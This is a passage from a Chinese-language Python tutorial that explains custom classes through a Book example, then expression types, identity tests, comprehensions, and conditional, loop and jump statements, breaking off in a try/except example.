中，类定义语句通常会以<code>class</code>关键字开头。紧接着，我们需要为其指定一个<code>[类型名称]</code>，自定义类型的命名规则与变量是完全一致的，只不过在习惯上，我们通常会选择首字母大写的名称。再接着是需要在一对小括号中指定当前类型继承自哪一个<code>[父类]</code>，在 Python 3.x 中，所有自定义的类型都会默认继承自<code>object</code>类，所以如果没有特别指定的父类，这里其实是可以省略的。再接下来，<code>[类型的功能说明]</code>的部分其实就是用于描述该类型的文档字符串，我们可以用它对该类型的设计意图做个说明，包括该类型在被实例化时所需的参数、该类型所拥有的属性以及可执行的操作等。最后，我们就可以开始定义<code>[类型的属性和方法]</code>了。</p>\n<p>类型的属性通常指的是可以存储在该类及其实例中的数据，例如，如果我们想自定义一个表示“书”这个概念的自定义类型，它的书名、作者、出版社等子数据都属于“书”这个类型的属性。具体到了 Python 这门编程语言中，自定义类型的属性包括实例属性与类属性两种，它们的主要区别如下。</p>\n<ul>\n<li>\n<p>在数据的归属问题上：实例属性中的数据由该类型的每个实例各自拥有，相互独立；而类属性中的数据有且只有一份，由该类型的所有实例共有的属性。也就是说，类属性可以直接通过<code>[类型名称]</code>来访问的数据，而实例属性则是需要先将类型实例化成具体的对象，然后通过该对象才能访问的数据。</p>\n</li>\n<li>\n<p>属性的定义方式上：实例属性需要在一个名为<code>__init__()</code>特殊方法中通过<code>self</code>这个关键字来定义，该方法会在类型被实例化时被自动调用，并对该属性执行初始化操作，实例属性的定义就属于该初始化操作的一部分。而类属性的定义只需在上述语法规范中<code>[类型的属性和方法]</code>所在的缩进区域执行变量添加操作即可，没有特定的位置。例如，如果我们想为之前讨论的“书”这个类型添加一个名为<code>help</code>的类属性和书名、作者、出版社等实例属性，我们可以像下面这样来定义它们。</p>\n</li>\n</ul>\n<pre><code class=\"language-python\">class Book:\n    help = '''这里定义的是一个类属性。'''\n\n    def __init__(self, book_data):\n        # 这里将定义三个实例属性：\n        self.name = book_data[\"name\"]\n        self.author = book_data[\"author\"]\n        self.pub = book_data[\"pub\"]\n</code></pre>\n<p>在上述代码中，<code>__init__</code>就是该自定义类型的一个方法。在面向对象的概念中，类型的方法通常指的是该类型可以执行的操作。我们可以使用<code>def</code>关键字在上述语法规范中<code>[类型的属性和方法]</code>所在的缩进区域为自定义的类型添加方法。具体添加方式与之前介绍的函数定义语句是一样的，只不过在定义方法时需要记住一点：<strong>它的参数列表中必须要有一个名为<code>self</code>的参数，且必须是第一个参数</strong>。这个<code>self</code>参数用于指涉当前被称作的实例，它可以让我们在方法中访问该实例的属性和其他方法。下面是一个示例，展示了如何为之前的“书”类型添加一个名为<code>update_name</code>的方法，用于修改书名。</p>\n<pre><code class=\"language-python\">class Book:\n    help = '''这是一个类属性，用于提供当前类帮助信息。'''\n\n    def __init__(self, book_data):\n        self.name = book_data[\"name\"]\n        self.author = book_data[\"author\"]\n        self.pub = book_data[\"pub\"]\n\n    def update_name(self, new_name):\n        '''修改书名的方法'''\n        self.name = new_name\n</code></pre>\n<p>值得一提的是，虽然<code>__init__()</code>方法在使用方式上与传统面向对象编程语言中的构造函数非常类似，但它其实只是会被构造函数自动调用的初始化方法，而 Python 中真正的构造函数是另一个名为<code>__new__()</code>的特殊方法。只不过在大多数情况下，我们是不需要重新定义构造方法的，定义好初始化方法就足够了。与之相对地，如果我们需要在销毁一个自定义类型的实例时需要执行某些指定的操作，就需要通过定义另一个名为<code>__del__()</code>的特殊方法来实现。当然，考虑到该方法只会在我们显式调用<code>del</code>操作符或 Python 的垃圾回收机制销毁相关实例时才会被调用，而垃圾回收销毁实例的时机是不确定的，我并不建议读者在非必要的情况下去定义这个方法，它一般只会在需要手动释放某些重要的运行时资源时才会被定义。下面，让我们来完整地展示一下在 Python 语言中自定义一个<code>Book</code>类的全部代码：</p>\n<pre><code class=\"language-python\">class Book:\n    help = '''这是一个类属性，用于提供当前类帮助信息。'''\n    \n    def __init__(self, book_data):\n        '''\n        定义 Book 类的初始化方法，该方法需要定义以下两个参数：\n            self：这是初始化方法必须要有的参数，\n                用于指涉将被初始化的实例；\n            book_data：这是字典类型的数据对象，\n                    用于提供初始化时所要提供的数据；\n        '''\n        # 定义三个实例属性：\n        self.name = book_data[\"name\"]\n        self.author = book_data[\"author\"]\n        self.pub = book_data[\"pub\"]\n    \n    def update_name(self, new_name) :\n        '''\n        定义 Book 类中用于修改书名的方法，它需要定义以下两个参数：\n            self：用于指涉当前被称作的实例；\n            new_name：用于指定新书名的字符串对象；\n        '''\n\n        self.name = new_name\n\n    def __del__(self):\n        '''\n        定义 Book 类中用于销毁实例的方法，它需要定义以下参数：\n            self：用于指涉当前被称作的实例；\n        '''\n        print(\"delete \", self.name)        \n</code></pre>\n<p>在完成自定义类型的动作之后，我们就可以对该类型进行实例化并仔细相关操作了。例如，我们在下面以<code>Book</code>类为例，演示了如何查看该类的帮助信息、创建一个实例、修改书名以及销毁实例等操作。</p>\n<pre><code class=\"language-python\"># 通过类属性来查看 Book 类提供的帮助信息：\nprint(Book.help)\n# 创建实例：\nmy_book = Book({\n    \"name\" : \"Python 快速入门\",\n    \"author\" : \"lingjie\",\n    \"pub\" : \"人民邮电出版社\" \n})\n# 修改书名：\nmy_book.update_name(\"Python 3 快速入门\")\n# 销毁实例（这里只做演示之用，不建议手动销毁实例）：\ndel my_book\n</code></pre>\n<h2 id=\"表达式与语句\">表达式与语句</h2>\n<p>众所周知，计算机程序本质上就是一组用某一门编程语言编写而成的指令序列，人类用这门语言表达自己的意图，而计算机则利用这门语言的解释器或编译器理解人类的意图，并将该意图转换成机器指令并执行它。所以，程序员的任务就是要学会用编程语言来表述自己的意图。和所有的语言一样，人们表述意图的基本单元通常被称为“语句”。我们在上一节中学习的变量及其数据类型就相当于人类语言中的“名词”和“动词”，它们所表达的是程序要载入到内存中的数据及其可执行的操作，而现在就是要学习如何按照自己的意图将这些“名词”和“动词”组织成控制程序流程的“语句”了。下面，让我们从最基本的表达式语句开始介绍。</p>\n<h3 id=\"表达式与赋值\">表达式与赋值</h3>\n<p>无论我们使用的是人类语言还是计算机编程语言，编写语句的第一步是要明确自己要表达的内容。该内容可以是执行某个动作，也可以是呈现某个状态。当然，在没有习惯用 Python 语言表达自己意图之前，不妨先用自己熟悉的人类语言将要表达的内容写出来，然后再试着将其翻译成编程语言。举个例子，如果我们想用自然语言来描述将人民币的币值换算成美元的过程，通常会用以下三个短句来描述其具体要执行的步骤：</p>\n<ul>\n<li>先获取人民币的币值：100。</li>\n<li>再取得人民币对美元的汇率：0.1404。</li>\n<li>将人民币的币值乘以汇率，即为美元币值。</li>\n</ul>\n<p>下面，让我们再用 Python 语言来翻译一下上面这三个短句：</p>\n<pre><code class=\"language-python\">CNY = 100\nex_rate = 0.1404\nUSD = CNY * ex_rate\n</code></pre>\n<p>上述代码中出现了三条 Python 语句。它们都是需按照<code>[变量名称] = [表达式])</code>这样的语法规则编写而成，主要作用是将赋值操作符（<code>=</code>）右侧的表达式赋给左侧的变量，通常被称为<strong>赋值语句</strong>。另外，如果被赋值的<code>[变量名称]</code>是第一次出现当前作用域中的话，它们同时也充当了变量定义语句的角色。在这类语句中，变量被赋予的值及其数据类型就取决于赋值操作符右侧的表达式了。另外在 Python 中，通常一个逻辑行代表着一条独立的语句。如果某一条赋值语句因右侧的表达式过长而影响了代码的可读性，代码编辑器可能会对其进行自动换行，但它在 Python 运行时环境看来依然属于同一逻辑行。例如，我们可以对之前的<code>say_hello</code>函数做一些修改，让它输出的内容丰富一些。</p>\n<pre><code class=\"language-python\">def say_hello(name):\n    # 省略之前的代码\n    message = \"\\nThis is an object-oriented,open-source programming language often used for rapid application development.Python's simple syntax emphasizes readability,reducing the cost of program maintenance, while its large library of functions and calls encourages reuse and extensibility.\"\n    print(message)\n</code></pre>\n<p>上述代码在 VS Code 编辑器中的显示效果如下图所示，读者可以看到，我们在<code>say_hello</code>函数的作用域中新增了一个名为<code>message</code>的变量，给它赋值了一个比较长的字符串，虽然编辑器将其自动换行成了三行内容，但它们在逻辑上依然被视为同一行内容来输出的，如图 4 所示。</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 4</strong>：Python 中的逻辑行与编辑器的自动换行</p>\n<p>在编程语言中，<strong>表达式</strong>通常是由一个或多个变量和运算符（或操作符）组合而成，主要作用是执行某种计算或逻辑判断，并返回一个结果。表达式可以是简单的，也可以是复杂的，具体取决于它们包含的运算符或操作符。下面，让我们来对编程中会用到的表达式做一个简单的整理。</p>\n<ul>\n<li>\n<p><strong>常量表达式</strong>： 这种表达式通常就是某一数据类型的字面常量，即直接使用具体的字面值来表示某一数据。譬如，我们在之前示例中使用的<code>100</code>、<code>0.1404</code>、<code>\"lingjie\"</code>等都属于常量表达式。在 Python 中，我们可以使用整数、浮点数、字符串等字面常量来表示常量表达式。</p>\n</li>\n<li>\n<p><strong>变量表达式</strong>： 这种表达式就是存储了某一类型数据的变量，即直接使用已被定义的变量来表示某一数据。譬如，我们在之前示例中使用的<code>CNY</code>、<code>ex_rate</code>、<code>USD</code>等都属于变量表达式。</p>\n</li>\n<li>\n<p><strong>算术表达式</strong>： 这种表达式通常由一个或多个变量和算术运算符组成，它的主要作用是执行算术运算。譬如上面的例子中，<code>CNY * ex_rate</code>就是一个典型的算术表达式。在 Python 中，我们常用到的算术运算符主要包括加法<code>+</code>、减法<code>-</code>、乘法<code>*</code>、除法<code>/</code>、整除<code>//</code>、取余<code>%</code>和乘方<code>**</code>这七种。</p>\n</li>\n<li>\n<p><strong>关系表达式</strong>： 这种表达式通常由一个或多个变量和关系运算符组成，它的主要作用是执行关系判断。譬如，<code>CNY &gt;= 0</code>就是一个典型的关系表达式。在 Python 中，我们常用到的关系运算符主要包括大于<code>&gt;</code>、小于<code>&lt;</code>、大于等于<code>&gt;=</code>、小于等于<code>&lt;=</code>、等于<code>==</code>和不等于<code>!=</code>这六种。</p>\n</li>\n<li>\n<p><strong>逻辑表达式</strong>： 这种表达式通常由一个或多个变量和逻辑运算符组成，它的主要作用是执行逻辑判断。譬如，<code>CNY &gt;= 0 and ex_rate &gt;= 0</code>就是一个典型的逻辑表达式。在 Python 中，我们常用到的逻辑运算符主要包括与<code>and</code>、或<code>or</code>和非<code>not</code>这三种。</p>\n</li>\n<li>\n<p><strong>函数调用表达式</strong>： 这种表达式通常需按照<code>[函数名称]([参数列表])</code>这样的语法规则编写而成，它的主要作用是通过调用函数的动作来执行某一组预先定义好的操作。譬如，<code>print(USD)</code>就是一个典型的函数调用达式。</p>\n</li>\n<li>\n<p><strong>三元表达式</strong>： 这种表达式通常需按照<code>[表达式_1] if [条件] else [表达式_2]</code>这样的语法规则编写而成，它的主要作用是根据某一条件来决定返回哪个表达式的值。譬如，<code>\"Positive\" if CNY &gt;= 0 else \"Negative\"</code>就是一个典型的三元达式，它会在<code>CNY</code>的值大于或等于<code>0</code>时返回字符串<code>\"Positive\"</code>，否则返回字符串<code>\"Negative\"</code>。</p>\n</li>\n<li>\n<p><strong>成员访问表达式</strong>：这种表达式通常需按照<code>[对象名称].[属性]</code>或<code>[对象名称].[方法]([参数列表])</code>这样的语法规则编写而成，它的主要作用是通过点符号来访问指定对象的属性和方法。譬如，读者在上一节中看到的<code>my_book.update_name(\"Python 3 快速入门\")</code>就是一个典型的对象操作达式。</p>\n</li>\n<li>\n<p><strong>元素测试表达式</strong>： 这种表达式通常需按照<code>[元素] in [可迭代对象]</code>或<code>[元素] not in [可迭代对象]</code>这样的语法规则编写而成，它的主要作用是测试某个指定的值是否存在于指定的可迭代对象中。在这里，<code>[可迭代对象]</code>通常指的是列表、元组、集合或字典等数据类型的实例。譬如，如果<code>name_list</code>是一个包含多个字符串的列表，那么<code>\"lingjie\" in name_list</code>就是一个成员测试表达式，它会在<code>name_list</code>中包含字符串<code>\"lingjie\"</code>时返回<code>True</code>，否则返回<code>False</code>。</p>\n</li>\n<li>\n<p><strong>元素访问表达式</strong>： 这种表达式通常需按照<code>[可迭代对象][索引]</code>或<code>[可迭代对象][键]</code>这样的语法规则编写而成，它的主要作用是通过索引或键来访问指定的可迭代对象中的元素。在这里，<code>[可迭代对象]</code>通常指的是列表、元组、集合或字典等数据类型的实例。譬如，如果<code>name_list</code>是一个包含多个字符串的列表，那么<code>name_list[0]</code>就是一个元素访问表达式，它会返回列表中第一个元素的值。</p>\n</li>\n<li>\n<p><strong>集合切片表达式</strong>： 这种表达式通常需按照<code>[可迭代对象][起始索引:结束索引]</code>这样的语法规则编写而成，它的主要作用是通过切片操作来访问指定的可迭代对象中的一段元素序列。在这里，<code>[可迭代对象]</code>通常指的是列表、元组或字符串等数据类型的实例。譬如，如果<code>name_list</code>是一个包含多个字符串的列表，那么<code>name_list[0:2]</code>就是一个集合切片表达式，它会返回列表中第一个和第二个元素组成的子序列。</p>\n</li>\n<li>\n<p><strong>同一性测试表达式</strong>：这种表达式通常需按照<code>[变量名称_1] is [变量名称_2]</code>或<code>[变量名称_1] is not [变量名称_2]</code>这样的语法规则编写而成，它的主要作用是测试<code>[变量名称_1]</code>和<code>[变量名称_2]</code>是否指向的是相同的对象。同一性运算符（<code>is</code>和<code>is not</code>）和关系运算符（<code>==</code>和<code>!=</code>）的区别是，前者比较的是对象在内存中的位置，而后者比较的是对象中存储的值。下面，让我们用几个具体的示例来帮助读者加深理解：</p>\n<pre><code class=\"language-python\"># 示例1：相同的值，不同的对象\nlist1 = [1, 2, 3]\nlist2 = [1, 2, 3]  # 值相同但不同对象\n\nprint(list1 == list2)  # 输出: True (值相等)\nprint(list1 is list2)  # 输出: False (不是同一个对象)\n\n# 示例2：相同的对象\nlist3 = list1\nprint(list1 == list3)  # 输出: True (值相等)\nprint(list1 is list3)  # 输出: True (同一个对象)\n\n# 示例3：小整数驻留现象（驻留是 Python 的一种内存优化机制）\na = 256\nb = 256\nprint(a == b)  # 输出: True\nprint(a is b)  # 输出: True (Python 对小整数进行缓存优化)\n\nc = 257\nd = 257\nprint(c == d)  # 输出: True\nprint(c is d)  # 输出: False (大于 256 的整数不缓存)\n\n# 示例4：None 比较\nx = None\ny = None\nprint(x == y)  # 输出: True\nprint(x is y)  # 输出: True (None 是单例对象)\n\n# 示例5：字符串驻留\ns1 = \"hello\"\ns2 = \"hello\"\nprint(s1 == s2)  # 输出: True\nprint(s1 is s2)  # 输出: True (短字符串会被驻留)\n\ns3 = \"hello world!\"\ns4 = \"hello world!\"\nprint(s3 == s4)  # 输出: True\nprint(s3 is s4)  # 输出: False (长字符串不会驻留)\n</code></pre>\n</li>\n<li>\n<p><strong>Python 推导式</strong>：这种表达式通常需按照<code>[元素] for [元素] in [可迭代对象]</code>或<code>[元素] for [元素] in [可迭代对象] if [条件表达式]</code>这样的语法规则编写而成，它的主要作用是通过遍历指定的可迭代对象来生成一个新的可迭代对象。在这里，<code>[可迭代对象]</code>通常指的是列表、元组或集合等数据类型的实例。譬如：</p>\n<ul>\n<li>\n<p>如果<code>name_list</code>是一个包含多个字符串的列表，那么<code>[name for name in name_list]</code>或<code>[name for name in name_list if len(name) &gt; 3]</code>就是一个列表推导式，前者会用<code>name_list</code>中的所有元素创建一个新的列表，而后者则会用<code>name_list</code>中所有长度大于 3 的元素创建一个新的列表。</p>\n</li>\n<li>\n<p>如果<code>phone_book</code>是一个包含多个电话号码的字典，那么<code>{name:phone for name, phone in phone_book.items()}</code>或<code>{name:phone for name, phone in phone_book.items() if len(phone) == 11}</code>就是一个字典推导式，前者会用<code>phone_book</code>中的所有元素创建一个新的字典，而后者则会用<code>phone_book</code>中所有电话号码长度为 11 的元素创建一个新的字典。</p>\n</li>\n<li>\n<p>如果<code>number_set</code>是一个包含多个整数的集合，那么<code>{num for num in number_set}</code>或<code>{num for num in number_set if num % 2 == 0}</code>就是一个集合推导式，前者会用<code>number_set</code>中的所有整数创建一个新的集合，而后者则会用<code>number_set</code>中所有偶数创建一个新的集合。</p>\n</li>\n<li>\n<p>如果<code>name_tuple</code>是一个包含多个字符串的元组，那么<code>(name for name in name_tuple)</code>或<code>(name for name in name_tuple if len(name) &gt; 3)</code>就是一个生成器推导式，前者会用<code>name_tuple</code>中的所有元素创建一个生成器对象，而后者则会用<code>name_tuple</code>中所有长度大于 3 的元素来创建一个生成器对象。在这里，它之所以被称为生成器推导式，而不是元组推导式，是因为它执行的是一种被称为“惰性求值”的操作。也就是说，该推导式返回的是一个生成器对象，而不是一个新的元组。这个生成器对象需要通过调用<code>next()</code>函数或使用<code>for</code>循环来动态、按需地生成元素，而不是一次性地生成所有元素，这有助于在处理大量数据时节省内存空间。例如，如果我们想要从一个包含大量字符串的元组中筛选出所有长度大于 3 的字符串，我们可以使用生成器推导式来实现这一点，而不是一次性地将所有符合条件的字符串都存储在内存中，就像下面这样：</p>\n<pre><code class=\"language-python\"># 这里假设我们有一个包含大量字符串的文本文件 large_data.txt，\n# 每行一个字符串，我们可以先将其读取为一个元组。\nwith open(\"large_data.txt\", \"r\") as f:\n    name_tuple = tuple(f.read().splitlines())\n# 使用生成器推导式来筛选出所有长度大于 3 的字符串\nlong_names = (name for name in name_tuple if len(name) &gt; 3)\n# 使用 for 循环来动态地生成并处理这些字符串\nfor name in long_names:\n    print(name) # 这里会逐个输出所有长度大于 3 的字符串\n</code></pre>\n<p>当然，如果非要一次性地获得一个新的元组，我们也可以使用<code>tuple()</code>函数来将生成器推导式的结果转换为一个元组对象，例如，我们可以对上述<code>long_names</code>生成器对象执行如下操作：</p>\n<pre><code class=\"language-python\"># 使用 tuple() 函数将生成器推导式的结果转换为一个新的元组\nlong_names_tuple = tuple(long_names)\n# 现在 long_names_tuple 就是一个包含所有长度大于 3 的字符串的新元组\nprint(long_names_tuple) # 这里会输出所有长度大于 3 的字符串\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"流程控制语句\">流程控制语句</h3>\n<p>在实际编程工作中，我们更多时候使用的是由表达式和其他流程控制语法共同组合而成的，这些语句往往被用于表述比简单的赋值操作更复杂的流程控制意图，我们将其统称为流程控制语句。按照具体的作用，我们可以将流程控制语句细分为条件、循环和跳转三种语句。下面，让我们分别来介绍一下它们。</p>\n<p>到目前为止，我们所看到的所有程序都是按照语句出现的顺序一路执行到底的，基本没有任何应变能力。如果我们希望自己编写的程序能具备一定的“随机应变”能力，就得让它执行条件判断。在编程语言中，我们用来表述条件判断的语句叫做<strong>条件语句</strong>。条件语句在编程设计概念中属于流程控制语句中的一种，它的主要作用是根据某一由程序员预先指定的条件来决定是执行还是跳过某部分的语句（这些语句通常被称之为条件分支）。</p>\n<p>在 Python 中，条件语句主要指的是以<code>if</code>关键字开头的条件判断语句，这种语句也是编程设计中最常见、最基本的一种流程控制语句，它根据条件分支的多少，可以分为以下三种形式。</p>\n<ul>\n<li>\n<p>单分支形式：这种形式的<code>if</code>语句只用于指定在某条件成立时需要执行的条件分支，具体语法如下：</p>\n<pre><code class=\"language-python\">if [条件表达式]:\n    [分支语句]\n</code></pre>\n</li>\n<li>\n<p>双分支形式：这种形式的<code>if</code>语句会同时指定在某条件成立或不成立时需要执行的条件分支，具体语法如下：</p>\n<pre><code class=\"language-python\">if [条件表达式]:\n    [分支语句]\nelse:\n    [分支语句]\n</code></pre>\n</li>\n<li>\n<p>多分支形式：这种形式的<code>if</code>语句会根据多个条件来决定程序需要执行的条件分支，具体语法如下：</p>\n<pre><code class=\"language-python\">if [条件表达式]:\n    [分支语句]\nelif [条件表达式]:\n    [分支语句]\nelif [条件表达式]:\n    [分支语句]\n...\nelse:\n    [分支语句]\n</code></pre>\n</li>\n</ul>\n<p>在这里，<code>[条件表达式]</code>主要会是一些返回布尔类型的表达式，譬如关系表达式、逻辑表达式等。而<code>[分支语句]</code>的部分则既可以是简单的表达式语句，也可以是一个采用同一缩进格式的语句块。下面，我们通过一个具体的例子来演示一下<code>if</code>语句的用法。大家都知道，货币的币值通常不会为负数，基于这一点，我们可以对之前币值换算代码做出如下修改：</p>\n<pre><code class=\"language-python\">ex_rate = 0.1404\nCNY = 200\nif CNY &gt;= 0:\n    USD = CNY * ex_rate\n    print(\"换算的美元币值为：\", USD)\n\n# 继续后面的代码...\n</code></pre>\n<p>在这种情况下，我们只会在<code>CNY</code>的值大于或大于<code>0</code>时才会看到输出结果。但是这种做法有个问题，那就是一旦<code>CNY</code>的值为负数，我们在执行这段代码时将看不到任何反馈信息，甚至不确定程序是否运行过。为了解决问题，我们要让代码在条件不成立时也输出一条提示信息：</p>\n<pre><code class=\"language-python\">ex_rate = 0.1404\nCNY = 200\nif CNY &gt;= 0:\n    USD = CNY * ex_rate\n    print(\"换算的美元币值为：\", USD)\nelse:\n    print(\"人民币的币值不能为负数！\")\n\n# 继续后面的代码...\n</code></pre>\n<p>当然，如果我们还想确保<code>ex_rate</code>的值也不是负数，也可以继续将代码修改成一个多分支判断：</p>\n<pre><code class=\"language-python\">ex_rate = -0.1404  # 现在汇率为负值。\nCNY = 200\nif CNY &lt; 0:\n    print(\"人民币的币值不能为负数！\")\nelif ex_rate &lt; 0:\n    print(\"人民币对美元的汇率不能为负数！\")\nelse:\n    USD = CNY * ex_rate\n    print(\"换算的美元币值为：\", USD)\n\n# 继续后面的代码...\n</code></pre>\n<p>在测试上面这些条件语句时，细心的读者可能已经发现了一个问题，那就是这些条件语句都只能执行一次。而我们如果想测试不同的数据，就得去修改代码本身，这种测试方法不仅操作不方便，而且根本没有办法面对海量的测试数据。如果想要解决这个问题，我们就得想办法让程序能根据我们所指定的条件来重复执行某部分的语句，而这就涉及到了编程语言中另一种流程控制语句：<strong>循环语句</strong>。</p>\n<p>在 Python 中，循环语句主要有<code>for</code>语句和<code>while</code>语句两种形式。下面，就让我们分别来介绍一下它们。从使用习惯上来说，<code>for</code>语句的整个循环过程通常会由某种遍历操作来驱动，其具体语法如下：</p>\n<pre><code class=\"language-python\">for [循环变量] in [被遍历对象]：\n    [被循环语句]\n</code></pre>\n<p>下面具体解释一下上述语法格式中涉及到的语法单元。首先，<code>[循环变量]</code>的作用是读取<code>[被遍历对象]</code>中的每一个值，由于这个变量将被用于驱动整个循环的执行，故而被称之为循环变量；然后，<code>[被遍历对象]</code>通常会是一个可被遍历的数据结构对象，只要该对象中的最后一个元素尚未被<code>[循环变量]</code>读取，循环就会一直执行下去；最后，<code>[被循环语句]</code>就是该循环要重复执行的语句，它既可以是简单的表达式语句，也可以是一个采用了同一缩进格式的语句块。例如，如果你想在命令行终端中逐行输出从 0 到 9 这十个数字，就可以像下面这样做：</p>\n<pre><code class=\"language-python\">for item in range(0, 10): # 生成一个包含 0 到 9 的整数序列\n    print(item)\n</code></pre>\n<p><code>while</code>语句与<code>for</code>语句相比，最大的区别在于它并没有为<code>[循环变量]</code>预留固定的语法单元，其具体语法如下：</p>\n<pre><code class=\"language-python\">while [循环条件测试]:\n    [被循环语句]\nelse: # 可选的语句\n    [循环结束后执行的语句]\n</code></pre>\n<p>正如读者所见，<code>while</code>语句中的语法单元只有两个：在<code>[循环条件测试]</code>处，我们只需要设置一个能返回布尔类型的表达式即可。只要该表达式测试的结果<code>True</code>，循环就会一直执行下去，直到它因满足某一条件而返回<code>False</code>为止；而<code>[被循环语句]</code>就是该循环要重复执行的语句，同样的，它既可以是简单的表达式语句，也可以是一个采用了同一缩进格式的语句块。另外，如果我们想在<code>while</code>循环结束后执行某些特定的操作，也可以在<code>while</code>语句的末尾添加一个可选的<code>else</code>语句块来实现。需要注意的是，<code>else</code>语句块中的语句只会在循环正常结束时才会被执行，而不会在循环被提前终止时被执行。</p>\n<p>与<code>for</code>语句的语法格式相比，<code>while</code>语句显然具有更高的自由度，它允许程序员更灵活地安排循环的执行方式（当然了，这也意味着它更容易出错），因此在习惯上更适合用来描述一些执行次数不确定的循环操作。例如，如果我们需要基于<code>readLine(text)</code>函数来编写一个循环语句来实现一个逐行读取多行文本的功能，由于<code>text</code>对象所指向的多行文本是由其调用方指定的，所以我们无法事先知道该循环语句究竟需要读取多少行文本，但只要能确定该函数会在读取完所有文本之后会返回<code>False</code>，就可以利用下面这个<code>while</code>语句来使用这个函数。</p>\n<pre><code class=\"language-python\">num = 1\nwhile line := readLine(text): # 这里使用了 Python 3.8+ 提供的海象运算符\n    print(f\"{num}. {line}\")   # 这里使用了 f-string 来实现格式化输出\n    num = num + 1\nelse:\n    print(f\"读取完毕，共读取了 {num - 1} 行文本。\")\n</code></pre>\n<p>需要特别说明的是，我们在上述<code>while</code>语句的<code>[循环条件测试]</code>处使用了自 Python 3.8 版本之后引入的海象运算符（<code>:=</code>），它的作用是将右侧的表达式结果赋值给左侧的变量，并返回该变量的值。这样，我们就可以在每次循环中直接读取文本行并将其存储到<code>line</code>变量中，而不需要在循环体内再单独执行一次赋值操作了，否则，和我们所熟悉的 C/C++/Java 语言不一样，Python 的语法规则是不允许在<code>while</code>语句的<code>[循环条件测试]</code>处直接执行赋值操作的。如果读者使用的是 Python 3.8 之前的版本，就需要将上述代码修改成下面这样：</p>\n<pre><code class=\"language-python\">num = 1\nline = readLine(text) # 先读取第一行文本\nwhile line: # 只要 line 不为空，就继续循环\n    print(f\"{num}. {line}\") # 使用 f-string 格式化输出\n    num = num + 1\n    line = readLine(text) # 再读取下一行文本\nelse:\n    print(f\"读取完毕，共读取了 {num - 1} 行文本。\")\n</code></pre>\n<p>当然了，如果我们硬要用<code>for</code>循环实现上面这样的循环，也是可以做到的，而且<code>while</code>循环也可以用来执行循环次数确定的遍历操作，这里只是笔者在使用习惯上所做的建议，并不存在绝对的一定之规。另外，在程序执行过程中，我们常常会遇到一些需要提前结束当前执行单元（譬如条件语句、循环语句）的特殊情况，这时候就会需要用到一种能让程序直接改变执行位置的语句，我们称之为<strong>跳转语句</strong>，下面来介绍一下 Python 语言中常用的几种跳转语句。</p>\n<ul>\n<li>\n<p><code>break</code>语句：该跳转语句的作用就是让程序的流程直接跳出当前正在执行的条件语句与循环语句。例如，如果我们希望之前那个读取文本的循环在遇到空行时就停止读取，就可以像下面这样做：</p>\n<pre><code class=\"language-python\">num = 1\nwhile line := readLine(text):\n    if line == \"\":\n        break\n    print(f\"{num}. {line}\") \n    num = num + 1\nelse:\n    print(f\"读取完毕，共读取了 {num - 1} 行文本。\")\n</code></pre>\n</li>\n<li>\n<p><code>return</code>语句：该跳转语句的作用是让程序的流程终止当前函数的执行，并将指定的数据（如果有的话）返回给该函数的调用方。例如，如果我们希望将之前那个读取文本的循环放到一个名为<code>process_text</code>的函数中，并让它在遇到空行时就停止读取，并返回给调用方一个<code>False</code>值，就可以像下面这样做：</p>\n<pre><code class=\"language-python\">def process_text(text):\n    num = 1\n    while line := readLine(text):\n        if line == \"\":\n            return False\n        print(f\"{num}. {line}\") \n        num = num + 1\n    else:\n        print(f\"读取完毕，共读取了 {num - 1} 行文本。\")\n    return True  # 返回 True 表示读取成功\n</code></pre>\n<p>这样一来，我们就可以在调用该函数时根据返回值来判断要读取的文本中是否包含空行了。例如：</p>\n<pre><code class=\"language-python\">text = '''这是一个多行文本示例。\n下面是一个空行。\n\n这是最后一行。'''\nif not process_text(text):\n    print(\"读取文本时遇到空行，停止读取。\")\nelse:\n    print(\"文本读取成功。\")\n</code></pre>\n</li>\n<li>\n<p><code>continue</code>语句：该跳转语句只能被运用在循环语句中，作用是让程序的流程停止当前这一轮的循环操作，直接进入下一轮循环。例如，如今有很多文本格式是用空行来分割段落的（例如 Markdown）。这时候，如果我们觉得遇到空行就直接停止读取的方式不妥当，程序只需不输出空行就可以了，也可以像下面这样做：</p>\n<pre><code class=\"language-python\">num = 1\nwhile line := readLine(text):\n    if line == \"\":\n        continue\n    print(f\"{num}. {line}\")\n    num = num + 1\nelse:\n    print(f\"读取完毕，共读取了 {num - 1} 行文本。\")\n</code></pre>\n</li>\n<li>\n<p><code>pass</code>语句：该语句表示程序在当前位置不执行任何操作，并继续执行当前迭代中的下一行语句。它通常被用来占位，表示当前这一行语句是空的。例如，对于上面使用<code>continue</code>语句实现的功能，我们也可以使用<code>pass</code>语句来实现同样的效果，具体做法如下：</p>\n<pre><code class=\"language-python\">num = 1\nwhile line := readLine(text):\n    if line == \"\":\n        pass  # 不执行任何操作\n    else:\n        print(f\"{num}. {line}\")\n        num = num + 1\nelse:\n    print(f\"读取完毕，共读取了 {num - 1} 行文本。\")\n</code></pre>\n</li>\n</ul>\n<h3 id=\"一些专用语句\">一些专用语句</h3>\n<p>在 Python 语言中，除了基本的流程控制语句之外，还有一些专门用于处理特定场景的语句。下面，我们来介绍一下这些专用语句。</p>\n<ul>\n<li>\n<p><code>with</code>语句：该语句的作用是用于简化资源管理，通常被用来处理文件、网络连接等需要在使用后释放的资源。它会自动处理资源的打开和关闭，确保资源在使用完毕后被正确释放。例如，如果我们希望读取一个文件中的内容，可以像下面这样做：</p>\n<pre><code class=\"language-python\">with open(\"example.txt\", \"r\") as file:\n    for line in file:\n        print(line.strip())\n</code></pre>\n</li>\n<li>\n<p><code>try</code>、<code>except</code>、<code>finally</code>语句：这些语句的作用是用于处理异常情况，确保程序在遇到错误时不会崩溃。它们通常被用来捕获和处理运行时错误。例如，如果我们希望在读取文件时处理可能出现的文件不存在错误，可以像下面这样做：</p>\n<pre><code class=\"language-python\">try:\n    with open(\"example.txt\", \"r\") as file:\n        for line in file:\n            print(line.strip())\nexcept FileNotFoundError:\n    print(\"文件不存在，请检查文件路径。\")\nfinally:\n    